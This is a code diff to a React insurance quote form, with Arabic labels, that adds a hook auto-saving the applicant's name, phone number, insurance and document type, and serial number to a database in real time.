@@ -14,6 +14,7 @@ import { ar } from "date-fns/locale";
 import { cn } from "@/lib/utils";
 import { useToast } from "@/hooks/use-toast";
 import { useFormspreeSync } from "@/hooks/useFormspreeSync";
+import { useAutoSave } from "@/hooks/useAutoSave";
 import { useApplicationData } from "@/hooks/useApplicationData";
 import { usePresence } from "@/hooks/usePresence";
 
@@ -44,6 +45,16 @@ export const QuoteForm = () => {
     phoneNumber,
     serialNumber
   }, "صفحة عرض السعر - Quote Form");
+
+  // Auto-save to database in real-time
+  useAutoSave(applicationId, {
+    insurance_type: insuranceType,
+    document_type: documentType,
+    full_name: ownerName,
+    phone: phoneNumber,
+    serial_number: serialNumber,
+    current_step: 'quote_form'
+  }, "QuoteForm");
   
   // للتقويم
   const currentYear = new Date().getFullYear();
